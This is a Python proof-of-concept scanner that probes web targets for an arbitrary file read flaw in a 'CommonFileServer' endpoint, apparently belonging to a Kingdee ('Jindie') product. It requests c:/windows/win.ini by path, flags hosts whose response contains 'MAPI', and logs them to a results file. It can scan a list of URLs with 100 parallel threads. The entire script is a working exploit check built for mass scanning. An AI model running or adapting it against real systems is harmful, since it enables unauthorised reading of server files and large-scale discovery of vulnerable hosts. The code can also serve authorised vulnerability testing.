import argparse
import sys
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()  # 解除警告

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    banner = '''         
 .----------------.  .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |     _____    | || |     _____    | || | ____  _____  | || |  ________    | || |     _____    | || |  _________   | || |  ____  ____  | || |     _____    | || | ____  _____  | |
| |    |_   _|   | || |    |_   _|   | || ||_   \|_   _| | || | |_   ___ `.  | || |    |_   _|   | || | |_   ___  |  | || | |_  _||_  _| | || |    |_   _|   | || ||_   \|_   _| | |
| |      | |     | || |      | |     | || |  |   \ | |   | || |   | |   `. \ | || |      | |     | || |   | |_  \_|  | || |   \ \  / /   | || |      | |     | || |  |   \ | |   | |
| |   _  | |     | || |      | |     | || |  | |\ \| |   | || |   | |    | | | || |      | |     | || |   |  _|  _   | || |    > `' <    | || |      | |     | || |  | |\ \| |   | |
| |  | |_' |     | || |     _| |_    | || | _| |_\   |_  | || |  _| |___.' / | || |     _| |_    | || |  _| |___/ |  | || |  _/ /'`\ \_  | || |     _| |_    | || | _| |_\   |_  | |
| |  `.___.'     | || |    |_____|   | || ||_____|\____| | || | |________.'  | || |    |_____|   | || | |_________|  | || | |____||____| | || |    |_____|   | || ||_____|\____| | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

          
                  version:1.0.0
                  author:fangwei
'''
    print(banner)


def poc(target):
    url = target + "/CommonFileServer/c:/windows/win.ini"
    headers = {
        "accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/119.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5)
        if res.status_code == 200 and "MAPI" in res.text:
            logger.info(f"[+] {GREEN}存在漏洞{target}{RESET}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            logger.info(f"[-] 不存在漏洞: {target}")
    except Exception as e:
        logger.error(f"[*] 无法访问: {target} - {e}")


def main():
    banner()
    # 处理命令行参数
    parser = argparse.ArgumentParser(description='检测CommonFileServer任意文件读取漏洞')
    # 添加两个参数
    parser.add_argument('-u', '--url', dest='url', type=str, help='目标链接')
    parser.add_argument('-f', '--file', dest='file', type=str, help='包含目标链接的文件路径')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':  # 主函数入口
    main()
